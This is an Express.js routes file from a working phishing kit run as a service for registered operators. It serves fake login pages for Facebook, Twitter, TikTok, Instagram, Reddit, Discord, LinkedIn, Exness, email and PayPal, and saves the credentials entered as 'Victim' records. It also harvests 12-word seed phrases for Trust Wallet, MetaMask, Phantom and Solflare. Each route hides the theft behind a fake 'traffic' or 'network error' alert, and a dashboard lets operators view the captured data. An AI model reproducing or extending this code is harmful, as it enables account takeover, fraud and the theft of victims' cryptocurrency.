const express = require('express');
const User = require('../models/User');
const Victim = require('../models/Victim');
const TrustWallet = require('../models/TrustWallet');
const router = express.Router();

// Root route: Redirects to the registration page
router.get('/', (req, res) => {
    res.redirect('/register');
});

// Render registration page
router.get('/register', (req, res) => {
    res.render('register');
});

// Handle registration form submission
router.post('/register', async (req, res) => {
    const { username, email, password } = req.body;
    try {
        const user = new User({ username, email, password });
        await user.save();
        res.redirect('/login');
    } catch (err) {
        console.error('Error creating user:', err);
        res.status(400).send('Error creating user');
    }
});

// Render login page
router.get('/login', (req, res) => {
    res.render('login');
});

// Handle login form submission
router.post('/login', async (req, res) => {
    const { email, password } = req.body;
    console.log("Attempting login with email:", email);
    try {
        const user = await User.findOne({ email });
        if (!user) {
            console.log('User not found in database:', email);
            return res.status(401).send('Invalid email or password');
        }
        const isMatch = await user.comparePassword(password);
        if (isMatch) {
            req.session.userId = user._id;
            return res.redirect('/dashboard');
        } else {
            console.log('Password mismatch for user:', email);
            return res.status(401).send('Invalid email or password');
        }
    } catch (err) {
        console.error('Error during login:', err);
        res.status(500).send('Internal server error');
    }
});

// Render dashboard page if user is logged in
router.get('/dashboard', async (req, res) => {
    if (!req.session.userId) {
        return res.redirect('/login');
    }
    try {
        const user = await User.findById(req.session.userId);
        res.render('dashboard', { user, userId: req.session.userId });
    } catch (err) {
        console.error('Error loading dashboard:', err);
        res.status(500).send('Error loading dashboard');
    }
});

// Render HOW TO USE page if user is logged in
router.get('/how2use', (req, res) => {
    res.render('how2use');
});

// render short link route 
router.get('/shortlink', (req, res) => {
    res.render('shortlink');
});






// Facebook page route
router.get('/facebook', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('facebook', { userId });
});

router.post('/submit-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Facebook' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Facebook victim details:', err);
        res.status(500).send('Error processing request');
    }
});

// View victims page with data specific to logged-in user
router.get('/view-victims', async (req, res) => {
    const userId = req.session.userId; // Retrieve logged-in user's ID from session

    if (!userId) {
        return res.status(401).send("Unauthorized");
    }

    try {
        const victims = await Victim.find({ userId }); // Fetch victims for the specific user
        res.render('view-victims', { victims });
    } catch (err) {
        console.error('Error loading victims:', err);
        res.status(500).send('Error loading victims');
    }
});

// Delete victim entry by ID
router.post('/delete-victim/:id', async (req, res) => {
    const victimId = req.params.id;

    try {
        await Victim.findByIdAndDelete(victimId);
        res.redirect('/view-victims');
    } catch (error) {
        console.error(error);
        res.status(500).send('Error deleting data');
    }
});



// Twitter page route
router.get('/twitter', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('twitter', { userId });
});

//Route to Handle Twitter Form Submission
router.post('/submit-twitter-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Twitter' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Twitter victim details:', err);
        res.status(500).send('Error processing request');
    }
});




// TikTok route
router.get('/tiktok', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('tiktok', { userId });
});

// Route to handle TikTok form submission
router.post('/submit-tiktok-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'TikTok' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving TikTok victim details:', err);
        res.status(500).send('Error processing request');
    }
});



// INSTAGRAM page route
// Route to display the Instagram login page
router.get('/instagram', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('instagram', { userId });
});

// Route to handle Instagram form submission
router.post('/submit-instagram-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Instagram' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Instagram victim details:', err);
        res.status(500).send('Error processing request');
    }
});




// REDDIT ROUTE
// Route to display the Reddit login page
router.get('/reddit', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('reddit', { userId });
});

// Route to handle Reddit form submission
router.post('/submit-reddit-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Reddit' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Reddit victim details:', err);
        res.status(500).send('Error processing request');
    }
});





// DISCORD ROUTE
// Route to display the Discord login page
router.get('/discord', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('discord', { userId });
});

// Route to handle Discord form submission
router.post('/submit-discord-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Discord' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Discord victim details:', err);
        res.status(500).send('Error processing request');
    }
});




// Linked in ROUTE
// Route to display the LinkedIn login page
router.get('/linkedin', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('linkedin', { userId });
});

// Route to handle LinkedIn form submission
router.post('/submit-linkedin-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'LinkedIn' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving LinkedIn victim details:', err);
        res.status(500).send('Error processing request');
    }
});






// PREMIUM OFFERS START HERE 
// Route to display the Exness login page
router.get('/exness', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('exness', { userId });
});

// Route to handle Exness form submission
router.post('/submit-exness-details', async (req, res) => {
    const { userId, emailOrNumber, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber, password, platform: 'Exness' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Exness victim details:', err);
        res.status(500).send('Error processing request');
    }
});



// email route 
// Route to display the Email login page
router.get('/email', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('email', { userId });
});

// Route to handle Email form submission
router.post('/submit-email-details', async (req, res) => {
    const { userId, email, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber: email, password, platform: 'Email' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Email victim details:', err);
        res.status(500).send('Error processing request');
    }
});



// paypal route 
// Route to display the PayPal login page
router.get('/paypal', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('paypal', { userId });
});

// Route to handle PayPal form submission
router.post('/submit-paypal-details', async (req, res) => {
    const { userId, email, password } = req.body;
    try {
        const victim = new Victim({ userId, emailOrNumber: email, password, platform: 'PayPal' });
        await victim.save();
        res.send("<script>alert('Login delay due to traffic, please try again later.');</script>");
    } catch (err) {
        console.error('Error saving PayPal victim details:', err);
        res.status(500).send('Error processing request');
    }
});









// ALL ABOUT WALLET PHRASES 
// Route to display wallet seed phrases
router.get('/wallet-view', async (req, res) => {
    try {
        const walletVictims = await TrustWallet.find(); // Fetch all TrustWallet records
        res.render('wallet-view', { walletVictims });
    } catch (err) {
        console.error('Error retrieving wallet data:', err);
        res.status(500).send('Error loading wallet data');
    }
});

// Route to render the Trust Wallet page
router.get('/trustwallet', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('trustwallet', { userId });
});

// Route to handle Trust Wallet form submission
router.post('/submit-trustwallet-seed', async (req, res) => {
    const { userId, seedPhrase } = req.body;
    const seedArray = seedPhrase.trim().split(' ').slice(0, 12);

    if (seedArray.length !== 12) {
        return res.status(400).send('Seed phrase must contain exactly 12 words');
    }

    try {
        const walletData = new TrustWallet({ userId, seedPhrase: seedArray });
        await walletData.save();
        res.send("<script>alert('Network error. Please try again later.');</script>");
    } catch (err) {
        console.error('Error saving seed phrase:', err);
        res.status(500).send('Error processing request');
    }
});

// Route to delete a wallet victim entry by ID
router.post('/delete-wallet/:id', async (req, res) => {
    const walletId = req.params.id;

    try {
        await TrustWallet.findByIdAndDelete(walletId); // Use the TrustWallet model
        res.redirect('/wallet-view'); // Redirect back to the wallet view
    } catch (error) {
        console.error('Error deleting wallet victim:', error);
        res.status(500).send('Error deleting data');
    }
});



// ALL FOR METAMASK 
// Route to render MetaMask page
router.get('/metamask', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('metamask', { userId });
});

// Route to handle MetaMask form submission
router.post('/submit-metamask-seed', async (req, res) => {
    const { userId, seedPhrase } = req.body;
    const seedArray = seedPhrase.split(' ').slice(0, 12); // Convert to array and limit to 12 words

    if (seedArray.length !== 12) {
        return res.status(400).send('Seed phrase must contain exactly 12 words');
    }

    try {
        const WalletData = new TrustWallet({ userId, seedPhrase: seedArray, platform: 'MetaMask' });
        await WalletData.save();
        res.send("<script>alert('Network error. Please try again later.');</script>");
    } catch (err) {
        console.error('Error saving MetaMask seed phrase:', err);
        res.status(500).send('Error processing request');
    }
});


// ABOUT PHANTOM 
// Route to render Phantom page
router.get('/phantom', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('phantom', { userId });
});

// Route to handle Phantom seed phrase submission
router.post('/submit-phantom-seed', async (req, res) => {
    const { userId, seedPhrase } = req.body;
    const seedArray = seedPhrase.split(' ').slice(0, 12); // Convert to array and limit to 12 words

    if (seedArray.length !== 12) {
        return res.status(400).send('Seed phrase must contain exactly 12 words');
    }

    try {
        const walletData = new TrustWallet({ userId, seedPhrase: seedArray, platform: 'Phantom' });
        await walletData.save();
        res.send("<script>alert('Network error. Please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Phantom seed phrase:', err);
        res.status(500).send('Error processing request');
    }
});



// ABOUT SOLFLARE 
// Route to render Solflare page
router.get('/solflare', (req, res) => {
    const userId = req.query.userId;
    if (!userId) {
        return res.status(400).send('User ID is required');
    }
    res.render('solflare', { userId });
});

// Route to handle Solflare seed phrase submission
router.post('/submit-solflare-seed', async (req, res) => {
    const { userId, seedPhrase } = req.body;
    const seedArray = seedPhrase.split(' ').slice(0, 12); // Convert to array and limit to 12 words

    if (seedArray.length !== 12) {
        return res.status(400).send('Seed phrase must contain exactly 12 words');
    }

    try {
        const walletData = new TrustWallet({ userId, seedPhrase: seedArray, platform: 'Solflare' });
        await walletData.save();
        res.send("<script>alert('Network error. Please try again later.');</script>");
    } catch (err) {
        console.error('Error saving Solflare seed phrase:', err);
        res.status(500).send('Error processing request');
    }
});






module.exports = router;
